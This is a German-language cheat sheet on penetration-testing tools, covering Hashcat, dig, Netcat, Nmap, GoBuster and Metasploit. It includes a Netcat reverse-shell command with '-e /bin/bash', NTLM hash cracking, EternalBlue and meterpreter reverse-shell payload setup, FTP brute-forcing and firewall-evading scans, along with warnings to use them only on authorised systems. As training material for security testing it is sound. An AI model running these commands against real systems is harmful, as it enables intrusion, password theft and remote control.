# Dokumentation von Tools

# **Hilfreiche Online-Tools**

- **[ExploitDB aka Google Hacking DB](https://www.exploit-db.com/)**  
  Durchsuche indexierte Webseiten nach Schwachstellen (z. B. offene Dashboards).

- **[Shodan.io](https://www.shodan.io/)**  
  Finde offene Ports und Schwachstellen, indem du nach IPs oder Domains suchst.

- **[DNSDumpster](https://dnsdumpster.com/)**  
  Zeigt alle registrierten DNS-Einträge einer Domain an.

- **[Wayback Machine](https://web.archive.org/)**  
  Zugriff auf archivierte Versionen von Websites.

- **[Netcraft](https://www.netcraft.com/tools/)**  
  Analysiere Domains, SSL-Zertifikate und Serverinformationen.

---

# **Wichtige Terminal-Tools**

- **[[Hashcat]]** -> Hashcat ist ein Tool zum Knacken von Passwörtern, das verschiedene Angriffsmodi und Hash-Typen unterstützt.
  
- **[[Dig (Domain Information Groper)]]** -> Dig ist ein flexibles und leistungsstarkes DNS-Abfragetool, das Informationen über DNS-Einträge (z. B. A-, MX-, TXT-, SOA- und NS-Records) abruft und analysiert. Es eignet sich ideal für Netzwerkdiagnosen und das Debugging von DNS-Problemen.
  
- **[[Netcat]]** -> Netcat ist ein vielseitiges Tool zur Arbeit mit TCP- und UDP-Verbindungen. Es wird oft als "Schweizer Taschenmesser" für Netzwerke bezeichnet und eignet sich für Port-Scans, Datenübertragung, Debugging und einfache Server/Client-Kommunikation.
  
- **[[Nmap (Network Mapper)]]** -> Nmap ist ein mächtiges Open-Source-Tool für Netzwerkerkennung und Sicherheitsaudits. Es wird verwendet, um Netzwerke zu scannen, offene Ports und Dienste zu identifizieren sowie Betriebssysteme und Schwachstellen zu erkennen.
  
- **[[GoBuster]]** -> GoBuster ist ein Tool zum Directory- und DNS-Fuzzing. Es wird hauptsächlich verwendet, um versteckte Verzeichnisse, Dateien und Subdomains auf Webservern zu entdecken. Es ist ein schnelles, command-line-basiertes Tool, das auf Bruteforce-Techniken basiert.

- **[[Metasploit Framework]]** -> Metasploit ist ein leistungsstarkes Open-Source-Framework für Penetration Testing und Exploits. Es wird verwendet, um Schwachstellen zu identifizieren, Exploits auszuführen und Post-Exploitation-Aktivitäten durchzuführen.


---
---

## Hashcat

Hashcat ist ein Tool zum Knacken von Passwörtern, das verschiedene Angriffsmodi und Hash-Typen unterstützt.

### **Grundlegende-Syntax**
```bash
hashcat -m <hash_mode> -a <attack_mode> [optionen] <hash_file> [dictionary|mask]
```

### **Wichtige Parameter**
- **`-m` (Hash-Modus):** Gibt den Typ des Hashes an (z. B. NTLM, SHA256).  
  **Beispiel:**
  - `0` → MD5
  - `1000` → NTLM
  - `1800` → SHA512crypt (Unix)
  - Weitere Modi: [Hashcat-Modi Liste](https://hashcat.net/wiki/doku.php?id=hashcat)

- **`-a` (Angriffsmodus):** Legt die Angriffsmethode fest.
  **Beispiele:**
  - `0` → Wörterbuchangriff
  - `1` → Kombinationsangriff
  - `3` → Brute-Force-Angriff
  - `6` → Wörterbuch + Maskenangriff
  - `7` → Maskenangriff + Wörterbuch

- **`-o` (Output-Datei):** Speichert geknackte Hashes in einer Datei.

- **`-r` (Regeln):** Wendet Regeln auf Wörterlisten an (z. B. Permutationen).

- **`--show`:** Zeigt bereits geknackte Hashes aus der Ergebnisdatei an.

### **Beispiele für Hashcat-Befehle**

#### **1. Wörterbuchangriff (Dictionary Attack)**
```bash
hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```
- **`-m 1000`** → NTLM-Hashes.
- **`-a 0`** → Wörterbuchangriff.
- **`hashes.txt`** → Datei mit Hashes.
- **`rockyou.txt`** → Wörterliste (z. B. RockYou).

#### **2. Brute-Force-Angriff**
```bash
hashcat -m 1000 -a 3 hashes.txt ?a?a?a?a
```
- **`-a 3`** → Brute-Force-Angriff.
- **`?a?a?a?a`** → Maskensyntax für alle möglichen Zeichen (4 Zeichen lang).

#### **3. Maskenangriff**
```bash
hashcat -m 1000 -a 3 hashes.txt ?u?l?l?d?d
```
- **`?u`** → Ein Großbuchstabe.
- **`?l`** → Zwei Kleinbuchstaben.
- **`?d`** → Zwei Ziffern.
- **Ergebnis:** Passwörter wie `Abc12`.

#### **4. Kombination aus Wörterbuch und Regeln**
```bash
hashcat -m 1000 -a 0 -r rules/best64.rule hashes.txt /usr/share/wordlists/rockyou.txt
```
- **`-r rules/best64.rule`** → Wendet häufige Permutationen auf die Wörterliste an (z. B. Passwort123).

---
---

Dig (Domain Information Groper)

Dig ist ein flexibles und leistungsstarkes DNS-Abfragetool, das Informationen über DNS-Einträge (z. B. A-, MX-, TXT-, SOA- und NS-Records) abruft und analysiert. Es eignet sich ideal für Netzwerkdiagnosen und das Debugging von DNS-Problemen.

- [Offizielle Dig-Dokumentation](https://manpages.debian.org/buster/dnsutils/dig.1.en.html)
- DNS-Debugging-Tools:  [DNSDumpster](https://dnsdumpster.com)
  
#### **Grundlegende Syntax**
```
dig [Optionen] <Domain/Name/IP> [Abfragetyp] [Klasse] [@DNS-Server]
```

---

### **Wichtige Parameter**

- **Optionen:** Zusätzliche Informationen oder Formatierung.
- **Domain/Name/IP:** Die zu analysierende Domain oder IP-Adresse.
- **Abfragetyp:** Gibt den DNS-Record an, der abgefragt werden soll (z. B. `A`, `MX`, `NS`, `TXT`, `ANY`).
- **Klasse:** Typ der DNS-Datenbank (`IN` für Internet, `CH` für Chaosnetzwerke). Standard ist `IN`.
- **@DNS-Server:** Optionaler DNS-Server für die Anfrage (z. B. `@8.8.8.8` für Google DNS).

---

### **Häufige Anwendungsfälle**

1. **Standard-DNS-Abfrage**
   ```
   dig <domain>
   ```
   Beispiel:
   ```
   dig example.com
   ```
   - Liefert Standardinformationen (A-Record).

2. **Abfrage eines spezifischen DNS-Records**
   ```
   dig <domain> <record_type>
   ```
   Beispiel:
   ```
   dig example.com MX
   ```
   - Liefert MX-Records (Mailserver) der Domain.

3. **Abfrage an einen spezifischen DNS-Server**
   ```
   dig <domain> @<dns-server>
   ```
   Beispiel:
   ```
   dig example.com @8.8.8.8
   ```
   - Führt die Abfrage über Googles DNS-Server durch.

4. **Alle verfügbaren DNS-Records anzeigen**
   ```
   dig <domain> ANY
   ```
   Beispiel:
   ```
   dig example.com ANY
   ```
   - Gibt alle verfügbaren DNS-Records aus (abhängig von Serverkonfigurationen).

5. **Reverse-DNS-Lookup (PTR-Record)**
   ```
   dig -x <ip_address>
   ```
   Beispiel:
   ```
   dig -x 8.8.8.8
   ```
   - Gibt die Domain zurück, die der IP zugeordnet ist.

---

### **Erweiterte Optionen**

- **`+short`**  
  Gibt das Ergebnis in kurzer, kompakter Form aus.  
  Beispiel:
  ```
  dig example.com +short
  ```

- **`+noall +answer`**  
  Unterdrückt überflüssige Informationen und zeigt nur die Antwort.  
  Beispiel:
  ```
  dig example.com +noall +answer
  ```

- **`+trace`**  
  Verfolgt die DNS-Auflösung vom Root-Server bis zur Ziel-Domain.  
  Beispiel:
  ```
  dig example.com +trace
  ```

- **`+nssearch`**  
  Fragt alle autoritativen Nameserver der Domain ab.  
  Beispiel:
  ```
  dig example.com +nssearch
  ```

- **`+stats`**  
  Zeigt Statistiken zur DNS-Abfrage an.  
  Beispiel:
  ```
  dig example.com +stats
  ```

---

## Dig (Domain Information Groper)

### **Nützliche Kombinationen**

1. **Auflisten von Nameservern der Domain**
   ```
   dig example.com NS +short
   ```

2. **TXT-Records anzeigen (z. B. SPF oder DKIM)**
   ```
   dig example.com TXT
   ```

3. **WHOIS-Informationen des Nameservers**
   ```
   dig example.com NS +short | xargs -n1 whois
   ```

4. **Performance-Diagnose durch mehrere DNS-Server**
   ```
   dig example.com @8.8.8.8
   dig example.com @1.1.1.1
   ```

---

### **Beispiele für typische DNS-Records**

- **A-Record (Address Record):** Gibt die IPv4-Adresse der Domain zurück.  
  ```
  dig example.com A
  ```

- **AAAA-Record:** Gibt die IPv6-Adresse der Domain zurück.  
  ```
  dig example.com AAAA
  ```

- **MX-Record:** Gibt die Mailserver der Domain zurück.  
  ```
  dig example.com MX
  ```

- **NS-Record:** Zeigt autoritative Nameserver der Domain.  
  ```
  dig example.com NS
  ```

- **CNAME-Record:** Gibt einen Aliasnamen für eine Domain an.  
  ```
  dig alias.example.com CNAME
  ```

---

### **Fehlerbehebung mit Dig**

- **Problem:** Falsche oder keine Antwort von DNS-Server.  
  **Lösung:** Nutze `+trace`, um den Ablauf der DNS-Auflösung zu überprüfen.

- **Problem:** Nameserver sind nicht autoritativ.  
  **Lösung:** Nutze `+nssearch`, um autoritative Server zu finden.

- **Problem:** Unklare Ergebnisse.  
  **Lösung:** Verwende `+noall +answer` für eine vereinfachte Darstellung.

---
---

## Netcat

Netcat ist ein vielseitiges Tool zur Arbeit mit TCP- und UDP-Verbindungen. Es wird oft als "Schweizer Taschenmesser" für Netzwerke bezeichnet und eignet sich für Port-Scans, Datenübertragung, Debugging und einfache Server/Client-Kommunikation.

[Netcat Manpage](https://man7.org/linux/man-pages/man1/nc.1.html)

#### **Grundlegende Syntax**
```
nc [Optionen] <Ziel> <Port>
```

---

### **Häufig verwendete Optionen**

- **`-l`** → Lauscht auf eingehenden Verbindungen (Listen-Modus).  
- **`-p`** → Gibt den Port an, auf dem Netcat lauschen soll.  
- **`-u`** → Nutzt UDP anstelle von TCP.  
- **`-v`** → Zeigt detaillierte Verbindungsinformationen an (verbose).  
- **`-z`** → "Zero-I/O"-Modus, häufig für Port-Scans verwendet.  
- **`-w <Sekunden>`** → Timeout für Verbindungen festlegen.  
- **`-e <Programm>`** → Führt ein Programm aus, wenn eine Verbindung hergestellt wird (z. B. Shell). **(Achtung: Kann von Angreifern ausgenutzt werden.)**

---

### **Anwendungsfälle**

#### **1. Port-Scan**
```bash
nc -zv <IP-Adresse> <Port-Bereich>
```
Beispiel:
```bash
nc -zv 192.168.1.1 20-80
```
- **`-z`** → Sendet keine Daten, prüft nur, ob der Port offen ist.
- **`-v`** → Gibt detaillierte Ergebnisse aus.

#### **2. Einfache Verbindung zu einem Server**
```bash
nc <IP-Adresse> <Port>
```
Beispiel:
```bash
nc 192.168.1.1 80
```
- Baut eine Verbindung zu einem HTTP-Server auf. Eingabe von HTTP-Befehlen wie `GET /` möglich.

#### **3. Lokalen TCP-Server starten**
```bash
nc -l -p <Port>
```
Beispiel:
```bash
nc -l -p 1234
```
- Lauscht auf Port 1234 für eingehende Verbindungen.

#### **4. Dateiübertragung**
- **Datei senden:**
  ```bash
  nc <Ziel-IP> <Port> < datei.txt
  ```
- **Datei empfangen:**
  ```bash
  nc -l -p <Port> > empfangene_datei.txt
  ```

Beispiel:
- Auf Server (empfangen):
  ```bash
  nc -l -p 1234 > empfangene_datei.txt
  ```
- Auf Client (senden):
  ```bash
  nc 192.168.1.1 1234 < datei.txt
  ```

#### **5. Chat-Verbindung**
- **Server:**
  ```bash
  nc -l -p <Port>
  ```
- **Client:**
  ```bash
  nc <Ziel-IP> <Port>
  ```
Beispiel:
- Server:
  ```bash
  nc -l -p 1234
  ```
- Client:
  ```bash
  nc 192.168.1.1 1234
  ```

#### **6. Reverse Shell (Vorsicht!)**
- **Auf Server lauschen:**
  ```bash
  nc -l -p <Port>
  ```
- **Shell senden (auf Ziel):**
  ```bash
  nc <Ziel-IP> <Port> -e /bin/bash
  ```
Beispiel:
- Server:
  ```bash
  nc -l -p 4444
  ```
- Client:
  ```bash
  nc 192.168.1.1 4444 -e /bin/bash
  ```

**Achtung:** Reverse Shells können ein großes Sicherheitsrisiko darstellen. Nutzung nur in sicheren und kontrollierten Umgebungen.

---

### **Erweiterte Nutzung**

#### **1. UDP-Server und Client**
- **UDP-Server starten:**
  ```bash
  nc -u -l -p <Port>
  ```
- **UDP-Client verbinden:**
  ```bash
  nc -u <Ziel-IP> <Port>
  ```

#### **2. HTTP-Anfragen senden**
```bash
echo -e "GET / HTTP/1.1\r\nHost: example.com\r\n\r\n" | nc <IP-Adresse> 80
```
Beispiel:
```bash
echo -e "GET / HTTP/1.1\r\nHost: example.com\r\n\r\n" | nc 93.184.216.34 80
```

#### **3. Verbindung mit Timeout**
```bash
nc -w <Sekunden> <Ziel-IP> <Port>
```
Beispiel:
```bash
nc -w 5 192.168.1.1 80
```
- Beendet die Verbindung, wenn nach 5 Sekunden keine Antwort erfolgt.

#### **4. Proxy-Datenverkehr analysieren**
Netcat kann genutzt werden, um zwischen zwei Hosts als Proxy zu fungieren:
```bash
mkfifo /tmp/proxy
nc -l -p 8080 < /tmp/proxy | nc <Ziel-IP> 80 > /tmp/proxy
```

---

### **Fehlerbehebung und Tipps**

- **Problem:** Verbindung schlägt fehl.  
  **Lösung:** Prüfe Firewall-Einstellungen und stelle sicher, dass der Port auf beiden Seiten offen ist.

- **Problem:** Keine Ausgabe bei `-zv`.  
  **Lösung:** Teste explizit mit verschiedenen Protokollen (`-u` für UDP oder ohne `-u` für TCP).

- **Problem:** Datenübertragung zu langsam.  
  **Lösung:** Nutze spezialisierte Tools wie SCP oder rsync für große Dateien.

---

### **Sicherheitswarnung**

Netcat kann bei unsachgemäßer Verwendung Sicherheitsrisiken darstellen, insbesondere durch die Nutzung der Option `-e` (Remote Execution). Stelle sicher, dass das Tool nur in vertrauenswürdigen Umgebungen und mit ausreichender Zugriffskontrolle eingesetzt wird.

---
---

## Nmap (Network Mapper)

Nmap ist ein mächtiges Open-Source-Tool für Netzwerkerkennung und Sicherheitsaudits. Es wird verwendet, um Netzwerke zu scannen, offene Ports und Dienste zu identifizieren sowie Betriebssysteme und Schwachstellen zu erkennen.

#### **Grundlegende Syntax**
```
nmap [Optionen] <Ziel>
```

---

### **Häufige Scans**

#### **1. Standard-Scan**
```bash
nmap <IP-Adresse/Host>
```
- Scannt die 1000 beliebtesten Ports auf dem Ziel.

Beispiel:
```bash
nmap 192.168.1.1
```

#### **2. Port-Scan**
- **Bestimmte Ports scannen:**
  ```bash
  nmap -p <Port-Bereich> <IP-Adresse/Host>
  ```
  Beispiel:
  ```bash
  nmap -p 80,443 192.168.1.1
  ```
- **Alle Ports scannen:**
  ```bash
  nmap -p- <IP-Adresse/Host>
  ```

#### **3. Service- und Versionsscan**
```bash
nmap -sV <IP-Adresse/Host>
```
- Identifiziert laufende Dienste und ihre Versionen.

Beispiel:
```bash
nmap -sV 192.168.1.1
```

#### **4. Betriebssystem-Erkennung**
```bash
nmap -O <IP-Adresse/Host>
```
- Versucht, das Betriebssystem des Ziels zu identifizieren.

#### **5. Netzwerk-Scan**
```bash
nmap <IP-Bereich>
```
Beispiel:
```bash
nmap 192.168.1.0/24
```
- Scannt alle Hosts im Subnetz.

---

### **Erweiterte Scans**

#### **1. Ping-Scan**
```bash
nmap -sn <IP-Adresse/Host>
```
- Prüft, ob das Ziel erreichbar ist, ohne Ports zu scannen.

#### **2. Stealth-Scan**
```bash
nmap -sS <IP-Adresse/Host>
```
- Halb-offener TCP-Scan (SYN-Scan), oft zur Umgehung von Firewalls verwendet.

#### **3. UDP-Scan**
```bash
nmap -sU <IP-Adresse/Host>
```
- Scannt offene UDP-Ports.

#### **4. Intensiver Scan**
```bash
nmap -T4 -A -v <IP-Adresse/Host>
```
- Führt einen detaillierten Scan mit Service-Erkennung, OS-Erkennung und Script-Scanning durch.

---

### **Optionen für Zielangabe**

- **Einzelne IP-Adresse:**
  ```bash
  nmap 192.168.1.1
  ```
- **Domain:**
  ```bash
  nmap example.com
  ```
- **IP-Bereich:**
  ```bash
  nmap 192.168.1.1-100
  ```
- **Subnetz:**
  ```bash
  nmap 192.168.1.0/24
  ```
- **Liste aus Datei:**
  ```bash
  nmap -iL <Dateipfad>
  ```

---

### **Nützliche Optionen**

#### **1. Ausgabeformate**
- **Normal:**
  ```bash
  nmap -oN <Dateipfad> <Ziel>
  ```
- **Greppable:**
  ```bash
  nmap -oG <Dateipfad> <Ziel>
  ```
- **XML:**
  ```bash
  nmap -oX <Dateipfad> <Ziel>
  ```
- **Alle Formate gleichzeitig:**
  ```bash
  nmap -oA <Basisname> <Ziel>
  ```

#### **2. Geschwindigkeit einstellen**
- **`-T0` bis `-T5`**: Geschwindigkeit (von langsam bis aggressiv).
  ```bash
  nmap -T4 <Ziel>
  ```

#### **3. Script-Scanning**
```bash
nmap --script=<Scriptname> <Ziel>
```
Beispiel:
```bash
nmap --script=vuln 192.168.1.1
```
- Nutzt NSE-Scripts, um Schwachstellen zu analysieren.

---

### **Beispiele für typische Scans**

#### **1. Top 1000 Ports**
```bash
nmap <IP-Adresse/Host>
```

#### **2. Alle Ports**
```bash
nmap -p- <IP-Adresse/Host>
```

#### **3. Ziel hinter Firewall**
```bash
nmap -Pn <IP-Adresse/Host>
```
- Überspringt den Ping-Test und scannt direkt.

#### **4. Schwachstellen-Scan**
```bash
nmap --script=vuln <IP-Adresse/Host>
```

#### **5. Subnetz-Scan**
```bash
nmap 192.168.1.0/24
```

#### **6. OS- und Service-Erkennung**
```bash
nmap -A <IP-Adresse/Host>
```

---

### **Fehlerbehebung und Tipps**

- **Problem:** Keine Antwort vom Ziel.  
  **Lösung:** Nutze `-Pn`, um ICMP-Blockaden zu umgehen.

- **Problem:** Firewall blockiert Scans.  
  **Lösung:** Verwende den Stealth-Scan (`-sS`).

- **Problem:** Ergebnisse unvollständig.  
  **Lösung:** Scanne alle Ports (`-p-`) oder erhöhe die Geschwindigkeit (`-T4`).

---

### **Nützliche Kombinationen**

1. **Pings von aktiven Hosts speichern:**
   ```bash
   nmap -sn 192.168.1.0/24 -oG - | grep "Up" > aktive_hosts.txt
   ```

2. **Service-Erkennung für eine Liste:**
   ```bash
   nmap -sV -iL ip-liste.txt -oA scan_ergebnisse
   ```

3. **Explizite Protokoll-Scans:**
   ```bash
   nmap -sS -sU 192.168.1.1
   ```

---
---

## GoBuster

GoBuster ist ein Tool zum Directory- und DNS-Fuzzing. Es wird hauptsächlich verwendet, um versteckte Verzeichnisse, Dateien und Subdomains auf Webservern zu entdecken. Es ist ein schnelles, command-line-basiertes Tool, das auf Bruteforce-Techniken basiert.

#### **Grundlegende Syntax**
```bash
gobuster <Modus> -u <URL/Ziel> -w <Wordlist> [Optionen]
```

---

### **Modi**

- **`dir`** → Suche nach versteckten Verzeichnissen und Dateien.  
- **`dns`** → Suche nach Subdomains basierend auf einer Wordlist.  
- **`vhost`** → Bruteforce für virtuelle Hosts.  
- **`fuzz`** → Generisches Fuzzing basierend auf Platzhaltern.  

---

### **Häufige Anwendungsfälle**

#### **1. Directory-Bruteforcing (dir-Modus)**
```bash
gobuster dir -u <URL> -w <Wordlist> [Optionen]
```

Beispiel:
```bash
gobuster dir -u https://example.com -w /usr/share/wordlists/dirb/common.txt
```
- `-u` → Ziel-URL.  
- `-w` → Wordlist mit möglichen Verzeichnisnamen.  

Optionen:
- **`-x`** → Dateiendungen angeben (z. B. `.php, .html`).  
  ```bash
  gobuster dir -u https://example.com -w /usr/share/wordlists/dirb/common.txt -x php,html
  ```
- **`-k`** → Ignoriert SSL-Zertifikatsfehler bei HTTPS.  
- **`-t`** → Anzahl gleichzeitiger Threads festlegen (Standard: 10).  
  ```bash
  gobuster dir -u https://example.com -w /usr/share/wordlists/dirb/common.txt -t 20
  ```

#### **2. Subdomain-Bruteforcing (dns-Modus)**
```bash
gobuster dns -d <Domain> -w <Wordlist>
```

Beispiel:
```bash
gobuster dns -d example.com -w /usr/share/wordlists/dns/subdomains-top1million-5000.txt
```
- `-d` → Ziel-Domain.  

Optionen:
- **`-r`** → DNS-Server angeben.  
  ```bash
  gobuster dns -d example.com -w /path/to/wordlist.txt -r 8.8.8.8
  ```

#### **3. Virtuelle Hosts (vhost-Modus)**
```bash
gobuster vhost -u <URL> -w <Wordlist>
```

Beispiel:
```bash
gobuster vhost -u example.com -w /path/to/wordlist.txt
```

#### **4. Generisches Fuzzing (fuzz-Modus)**
```bash
gobuster fuzz -u <URL> -w <Wordlist>
```

Beispiel:
```bash
gobuster fuzz -u https://example.com/FUZZ -w /path/to/wordlist.txt
```
- Der Platzhalter `FUZZ` wird mit Werten aus der Wordlist ersetzt.

---

### **Erweiterte Optionen**

- **HTTP-Header anpassen:**  
  ```bash
  gobuster dir -u https://example.com -w /path/to/wordlist.txt -H "Authorization: Bearer <Token>"
  ```
- **Ausgabeformat:**  
  ```bash
  gobuster dir -u https://example.com -w /path/to/wordlist.txt -o ergebnisse.txt
  ```
- **Timeout festlegen:**  
  ```bash
  gobuster dir -u https://example.com -w /path/to/wordlist.txt --timeout 5s
  ```
- **Proxy nutzen:**  
  ```bash
  gobuster dir -u https://example.com -w /path/to/wordlist.txt --proxy http://127.0.0.1:8080
  ```

---

### **Typische Wordlists**

- **Für Directory-Scan:**  
  - `/usr/share/wordlists/dirb/common.txt`  
  - `/usr/share/wordlists/dirb/big.txt`  
- **Für DNS-Scan:**  
  - `/usr/share/wordlists/dns/subdomains-top1million-5000.txt`

---

### **Fehlerbehebung und Tipps**

- **Problem:** Langsame Scans.  
  **Lösung:** Erhöhe die Anzahl der Threads mit `-t`, z. B. `-t 50`.  

- **Problem:** Viele Fehler bei HTTPS-URLs.  
  **Lösung:** Nutze die Option `-k`, um SSL-Warnungen zu ignorieren.

- **Problem:** Kein Zugriff auf Ergebnisse.  
  **Lösung:** Verwende `-o`, um Ergebnisse in eine Datei zu speichern.  

---

### **Beispiele für verschiedene Szenarien**

1. **Verzeichnisse auf HTTPS-Server scannen (inkl. SSL-Fehler ignorieren):**
   ```bash
   gobuster dir -u https://example.com -w /usr/share/wordlists/dirb/common.txt -k
   ```

2. **Subdomains scannen mit spezifischem DNS-Server:**
   ```bash
   gobuster dns -d example.com -w /usr/share/wordlists/dns/subdomains-top1million-5000.txt -r 8.8.8.8
   ```

3. **Verzeichnisse mit spezifischen Dateiendungen scannen:**
   ```bash
   gobuster dir -u https://example.com -w /usr/share/wordlists/dirb/common.txt -x php,txt
   ```

4. **Scans durch Proxy leiten (z. B. Burp Suite):**
   ```bash
   gobuster dir -u https://example.com -w /path/to/wordlist.txt --proxy http://127.0.0.1:8080
   ```

---

### **Nützliche Ressourcen**

- [Offizielle GoBuster-Dokumentation](https://github.com/OJ/gobuster)  
- Wordlists: [SecLists Repository](https://github.com/danielmiessler/SecLists)  


---
---

## Metasploit Framework

Metasploit ist ein leistungsstarkes Open-Source-Framework für Penetration Testing und Exploits. Es wird verwendet, um Schwachstellen zu identifizieren, Exploits auszuführen und Post-Exploitation-Aktivitäten durchzuführen.

---

### **Grundlegende Befehle**

#### **Metasploit starten**
```bash
msfconsole
```
- Öffnet die interaktive Metasploit-Konsole.

---

### **Wichtige Befehle**

- **Hilfe anzeigen:**
  ```bash
  help
  ```
- **Module durchsuchen:**
  ```bash
  search <Begriff>
  ```
  Beispiel:
  ```bash
  search vsftpd
  ```
- **Modul auswählen:**
  ```bash
  use <Modulname>
  ```
  Beispiel:
  ```bash
  use exploit/unix/ftp/vsftpd_234_backdoor
  ```
- **Optionen anzeigen:**
  ```bash
  show options
  ```
- **Optionen setzen:**
  ```bash
  set <Variable> <Wert>
  ```
  Beispiel:
  ```bash
  set RHOSTS 192.168.1.1
  ```
- **Exploit starten:**
  ```bash
  exploit
  ```
  Oder:
  ```bash
  run
  ```

---

### **Module**

Metasploit bietet verschiedene Module für spezifische Aufgaben:

1. **Exploit-Module**: Angriffe auf Schwachstellen.  
2. **Payloads**: Nutzlasten wie Shells oder Meterpreter.  
3. **Auxiliary-Module**: Funktionen wie Scannen oder Brute-Forcing.  
4. **Encoders**: Umgehung von Signaturen und Schutzmaßnahmen.  
5. **Post-Exploitation-Module**: Aktionen auf kompromittierten Systemen.

---

### **Typische Workflows**

#### **1. Schwachstellen suchen**
```bash
search <Begriff>
```
Beispiel:
```bash
search smb
```

#### **2. Exploit auswählen**
```bash
use <Exploit-Pfad>
```
Beispiel:
```bash
use exploit/windows/smb/ms17_010_eternalblue
```

#### **3. Payload auswählen**
```bash
set PAYLOAD <Payload>
```
Beispiel:
```bash
set PAYLOAD windows/x64/meterpreter/reverse_tcp
```

#### **4. Ziel setzen**
```bash
set RHOSTS <IP-Adresse>
```
Beispiel:
```bash
set RHOSTS 192.168.1.1
```

#### **5. Exploit starten**
```bash
run
```

---

### **Nützliche Metasploit-Funktionen**

#### **1. Nmap-Scans importieren**
```bash
db_import <Pfad zur Datei>
```
Beispiel:
```bash
db_import /root/nmap_scan.xml
```

#### **2. Dienste anzeigen**
Nach dem Import von Nmap-Ergebnissen:
```bash
services
```

#### **3. Workspace erstellen**
Workspaces helfen dabei, verschiedene Projekte zu organisieren.
```bash
workspace -a <Name>
```
Beispiel:
```bash
workspace -a penetration_test
```

#### **4. Passwörter bruteforcen**
Mit einem Auxiliary-Modul:
```bash
use auxiliary/scanner/ftp/ftp_login
set RHOSTS <IP-Adresse>
set USER_FILE <Benutzerliste>
set PASS_FILE <Passwortliste>
run
```

#### **5. Pivoting und Tunneling**
Auf kompromittierten Maschinen:
```bash
use auxiliary/server/socks4a
run
```

---

### **Typische Exploits**

1. **MS17-010 (EternalBlue)**
   - Modul: `exploit/windows/smb/ms17_010_eternalblue`
   - Payload: `windows/x64/meterpreter/reverse_tcp`

2. **Tomcat Manager Exploit**
   - Modul: `exploit/multi/http/tomcat_mgr_upload`
   - Payload: `java/meterpreter/reverse_tcp`

3. **Vsftpd Backdoor**
   - Modul: `exploit/unix/ftp/vsftpd_234_backdoor`

---

### **Meterpreter**

**Meterpreter** ist ein erweiterter Payload, der mächtige Post-Exploitation-Funktionen bietet.

#### **Grundlegende Befehle**
- **Hilfe anzeigen:**
  ```bash
  help
  ```
- **Systeminformationen anzeigen:**
  ```bash
  sysinfo
  ```
- **Dateien auflisten:**
  ```bash
  ls
  ```
- **Arbeitsverzeichnis wechseln:**
  ```bash
  cd <Pfad>
  ```
- **Datei herunterladen:**
  ```bash
  download <Datei>
  ```
- **Screenshot aufnehmen:**
  ```bash
  screenshot
  ```
- **Shell öffnen:**
  ```bash
  shell
  ```

---

### **Tipps zur Nutzung**

1. **Sicherheit beachten**: Nutze Metasploit nur auf autorisierten Systemen.
2. **Up-to-date bleiben**: Regelmäßige Updates des Frameworks durchführen:
   ```bash
   msfupdate
   ```
3. **Umgebungen testen**: Virtuelle Maschinen nutzen, um Exploits zu üben.
4. **Daten speichern**: Ergebnisse regelmäßig mit Workspaces und Datenbanken sichern.

---

### **Ressourcen**

- [Offizielle Metasploit-Dokumentation](https://docs.rapid7.com/metasploit/)
- [Exploit Database](https://www.exploit-db.com/)
- [NSE Scripts Library](https://nmap.org/nsedoc/)



___
___


# Metasploit Workspaces


**Metasploit** ist ein **Workspace** ein Werkzeug, das hilft, die Ergebnisse von Penetrationstests zu organisieren und zu verwalten. Wenn du viele Systeme oder Netzwerke untersuchst, können die Daten schnell unübersichtlich werden. Workspaces schaffen eine Art "Container", um Informationen logisch voneinander zu trennen. Hier sind die wichtigsten Aspekte und Anwendungsfälle:

---

### **Was tun Metasploit Workspaces?**

1. **Datenorganisation:**
    
    - Workspaces ermöglichen es, Daten (wie Hosts, Netzwerke, Schwachstellen, Exploits etc.) in separate Kategorien zu unterteilen.
    - Zum Beispiel könntest du für verschiedene Kunden oder Netzwerke jeweils einen eigenen Workspace erstellen.
2. **Datenisolierung:**
    
    - Die Informationen in einem Workspace sind voneinander isoliert.
    - Wenn du in Workspace A arbeitest, siehst du keine Daten aus Workspace B.
3. **Schneller Kontextwechsel:**
    
    - Du kannst schnell zwischen verschiedenen Workspaces wechseln, um verschiedene Projekte oder Testumgebungen zu verwalten.
4. **Protokollierung und Berichterstattung:**
    
    - Jeder Workspace kann seine eigenen Reports oder Logs generieren, was für Audits und Berichte nützlich ist.

---

### **Wofür werden Workspaces verwendet?**

1. **Getrennte Projekte:**
    
    - In Penetrationstests arbeitest du oft an mehreren Projekten gleichzeitig. Ein Workspace für jedes Projekt hilft dir, die Ergebnisse übersichtlich zu halten.
    - Beispiel: Du untersuchst Netzwerk A (internes Netzwerk) und Netzwerk B (externe Perimeter). Beide können in getrennten Workspaces abgelegt werden.
2. **Teamarbeit:**
    
    - In größeren Teams können Workspaces dazu verwendet werden, spezifische Aufgaben zu trennen oder zu delegieren. Ein Workspace kann bestimmten Teammitgliedern zugewiesen werden.
3. **Multistage-Tests:**
    
    - Du könntest Workspaces für unterschiedliche Phasen eines Tests verwenden (z. B. **Reconnaissance**, **Exploitation**, **Post-Exploitation**).
4. **Vergleich von Szenarien:**
    
    - Workspaces können auch dazu genutzt werden, unterschiedliche Szenarien oder Zeitpunkte zu dokumentieren (z. B. vor und nach einer Sicherheitsmaßnahme).

---

### **Nützliche Befehle für Workspaces**

- **Workspaces auflisten:** 
  `workspace` 
  Zeigt alle verfügbaren Workspaces an.
  
- **Neuen Workspace erstellen**: 
  `workspace -a <workspace_name>`
  Erstellt einen neuen Workspace mit dem angegebenen Namen.
  
- **Zu einem Workspace wechseln:**
  `workspace <workspace_name>`
  Wechselt in den angegebenen Workspace.

- **Workspace löschen:**
  `workspace -d <workspace_name>
  Löscht den angegebenen Workspace.

- **Alle Daten eines Workspaces anzeigen:**
  `hosts`
  (oder ähnliche Befehle wie `services`, `vulns` usw.)

___

### **Praktisches Beispiel**

Angenommen, du arbeitest an einem Penetrationstest für zwei Kunden: **Firma Alpha** und **Firma Beta**. Du könntest zwei Workspaces erstellen:

1. **Workspace für **Firma Alpha**: 
   `workspace -a firma_alpha`

2. **Workspace -a firma_beta**:
   `workspace -a firma_beta`

Jetzt kannst du zwischen den Workspaces wechseln:

- Im Alpha-Workspace scanst du ihre IPs und speicherst Schwachstellen dort.
- Im Beta-Workspace machst du dasselbe für Beta.

Durch den Wechsel zwischen den Workspaces (`workspace firma_alpha` oder `workspace firma_beta`) bleiben die Daten sauber getrennt.
